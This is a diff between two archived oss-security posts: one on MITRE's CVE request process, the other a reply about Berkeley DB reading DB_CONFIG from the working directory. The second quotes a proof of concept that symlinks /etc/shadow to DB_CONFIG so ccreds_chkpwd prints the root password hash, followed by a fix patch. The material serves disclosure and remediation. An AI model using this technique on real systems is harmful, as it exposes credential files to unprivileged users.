@@ -1,114 +1,102 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/11/16
-Message-ID: <20170211233541.GA6315@openwall.com>
-Date: Sun, 12 Feb 2017 00:35:41 +0100
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/15/7
+Message-ID: <984d5eb4-ff73-b7ba-fe21-81db3c28f77e@oracle.com>
+Date: Thu, 15 Jun 2017 12:38:01 -0700
+From: Ritwik Ghoshal <ritwik.ghoshal@...cle.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: MITRE is adding data intake to its CVE ID process
+Subject: Re: Berkeley DB reads DB_CONFIG from cwd
 Content-Type: text/plain; charset=utf-8
 
-All - thank you for sharing your concerns in this thread.
+On 6/15/2017 7:40 AM, Solar Designer wrote:
+> On Sun, Jun 11, 2017 at 12:06:13AM +0200, Jakub Wilk wrote:
+>> Apparently Berkeley DB reads the DB_CONFIG configuration file from the 
+>> current working directory by default[*]. This is surprising and AFAICT 
+>> undocumented.
+>>
+>> Here's how to exploit it against pam_ccreds:
+>>
+>>    $ cat /etc/shadow
+>>    cat: /etc/shadow: Permission denied
+>>    $ ln -sf /etc/shadow DB_CONFIG
+>>    $ /sbin/ccreds_chkpwd moo < /dev/null
+>>    BDB1584 line 1: 
+>>    root:$1$QRCEVRMX$sPppjXE42AZnUPuEWf87D.:17327:0:99999:7:::: incorrect 
+>>    name-value pair
+>>
+>> (The above was tested on Debian jessie.)
+>>
+>> In the past, nss_db was also exploitable:
+>> CVE-2010-0826
+>>
+>>
+>> [*] More precisely, this seem to happen when you call db_create() with 
+>> dbenv=NULL; or if you use the dbm_open() function.
+> Besides possibly updating Postfix, what are distros going to do about
+> this?  
 
-FWIW, MITRE had notified me of this coming change a few days before the
-oss-security posting, and I e-mailed them privately with some of the
-same concerns and thoughts.
 
-MITRE - thank you for responding to the concerns, and for all your
-effort over the years.
+> What is upstream going to do?  Have they been contacted?
 
-On Fri, Feb 10, 2017 at 10:59:27PM -0500, cve-assign@...re.org wrote:
-> C5. I want MITRE to send the https://cveform.mitre.org form data, and
-> the CVE ID, to the oss-security list at the same time that these are
-> sent to the requester.
-> 
-> R5. We have had internal discussions within MITRE about this. We are
-> able to implement this easily if the community requires this approach.
-> At the moment, we are expecting the requester to resend this
-> information to oss-security once they accept their CVE ID assignment.
+Oracle is aware of this issue, and we are investigating.
 
-This sounds great.  Since a mailing list isn't great for polls (would be
-too many messages), I ran this Twitter poll instead (not the exact same
-community indeed, but I hope it's similar):
+--
+Thanks,
+-Ritwik
 
-https://twitter.com/solardiz/status/830164779893395456
 
-"When MITRE assigns a CVE ID to a public issue or once the issue is
-public, should they automatically post to a mailing list?"
+>
+> In the source code, it isn't necessarily as simple as commenting out the
+> undocumented functionality.  There doesn't appear to be any code
+> specific to the undocumented functionality, since it is documented that
+> the DB_CONFIG file is read from the environment's home directory and the
+> code is there primarily for that purpose.  Problems arise when the
+> environment is uninitialized, and it is unclear to me whether this was
+> possibly meant to imply the environment's home directory is the current
+> directory (but even if so, this behavior is dangerous and needs to go).
+>
+> At first, I tried checking for dbenv being NULL in __dbenv_config(),
+> which is where the hard-coded DB_CONFIG file name is found.  However, at
+> least when testing with Postfix' postmap program (without the recent
+> workaround), dbenv is non-NULL there, and per strace postmap does indeed
+> try to open DB_CONFIG in the current directory.  Thus, for now I opted
+> for this patch checking for and curing the symptom:
+>
+> --- db-4.3.29/env/env_open.c.orig       2004-12-23 02:58:21 +0000
+> +++ db-4.3.29/env/env_open.c    2017-06-15 13:59:43 +0000
+> @@ -500,7 +500,7 @@ __dbenv_config(dbenv, db_home, flags)
+>         if (p == NULL)
+>                 fp = NULL;
+>         else {
+> -               fp = fopen(p, "r");
+> +               fp = strcmp(p, "DB_CONFIG") ? fopen(p, "r") : NULL;
+>                 __os_free(dbenv, p);
+>         }
+>
+> This passes the postmap test for me (postmap no longer tries to open the
+> file), but I wonder if it possibly broke db's own tests.  I can't easily
+> run the tests as --enable-test says it needs TCL, which we don't
+> package.
+>
+> While at it, I found that rep/rep_backup.c has a comment saying it skips
+> DB_CONFIG, but the code actually skips DB_CONFIG* (that is, any filename
+> starting with DB_CONFIG) due to use of strncmp():
+>
+>                 /*
+>                  * Skip DB-owned files: ., ..,  __db*, DB_CONFIG, log*
+>                  */
+>                 if (strcmp(names[i], ".") == 0)
+>                         continue;
+>                 if (strcmp(names[i], "..") == 0)
+>                         continue;
+>                 if (strncmp(names[i], "__db", 4) == 0)
+>                         continue;
+>                 if (strncmp(names[i], "DB_CONFIG", 9) == 0)
+>                         continue;
+>                 if (strncmp(names[i], "log", 3) == 0)
+>                         continue;
+>
+> Either the comment or the code is wrong (I think the code is wrong), but
+> this is unimportant.
+>
+> Alexander
 
- 5% No
-63% Yes, to existing list(s)
-29% Yes, to new list(s)
- 3% Other
-
-98 votes in 24 hours
-
-There were no replies (besides the votes themselves), and no retweets.
-
-So 92% of those who voted want such postings to go to some mailing
-list(s).  63% want them to go to existing mailing list(s).  I suggest
-that those existing lists be oss-security for Open Source software and
-full-disclosure for other software (or for both?), although we'd need to
-hear from the moderators of full-disclosure regarding the latter.  For
-now, let's just say that we seem to want to have CVE ID assignments in
-Open Source software to be automatically posted to oss-security.
-
-MITRE - can you please implement that, and we'll see how it goes and
-whether we need it adjusted or possibly discontinued if things go wrong
-or if there's opposition (so far, there's almost none)?
-
-> Please see http://www.openwall.com/lists/oss-security/2017/02/09/26
-> for an example.
-
-This is also an example of how the change breaks threading.  First,
-there was a thread about the issue on the list.  Then there was CVE
-request and assignment off-list.  And then there's this new thread on
-the CVE assignment.
-
-To MITRE's credit, in this very example above they did suggest to "reply
-to your own oss-security post", which would then keep the thread.
-Perhaps this should be emphasized more, and the rationale explained?
-
-> C6. I want MITRE to send the https://cveform.mitre.org form data to
-> the oss-security list as soon as that data is entered (i.e., before a
-> CVE ID exists).
-> 
-> R6. We have had internal discussions within MITRE about this. We are
-> not yet able to implement this easily. We may work on this if the
-> community requires this approach. However, our understanding of CVE
-> consumers is that they look to MITRE as a source of vulnerability
-> information after a CVE ID number exists, not before.
-
-Many people interested in timely access to vulnerability detail, and who
-could contribute to discussions, are primarily not "CVE consumers".
-For example, I am more interested in being notified of a potentially
-relevant vulnerability than about it having a CVE ID number.
-
-Anyway, let's try with the CVE assignments postings first and see how it
-goes, especially given that it's easier for MITRE to implement.  It's
-easier for the oss-security moderators too, as MITRE will have already
-filtered out the spammy or otherwise unreasonable CVE requests (if any).
-
-A related concern, though, is that this pre-CVE-assignment vulnerability
-information is potentially valuable to attackers.  I also ran this other
-Twitter poll a week earlier:
-
-https://twitter.com/solardiz/status/828000469037547524
-
-"Are you concerned about potential leaks from or misuse by MITRE of
-non-public CVE request detail?"
-
-14% Who's MITRE, what's CVE?
-55% Yes: valid risk & concern
-23% No: can't happen or is OK
- 8% Other
-
-394 votes in 24 hours
-
-Many replies, including several people sharing anecdotal evidence of
-MITRE's integrity (and none to the contrary).  14 retweets.
-
-Thus, looks like a hotter topic than whether to post to mailing lists,
-yet the results may be biased by me bringing this question up (someone
-might not have been concerned before they read the question).
-
-Alexander
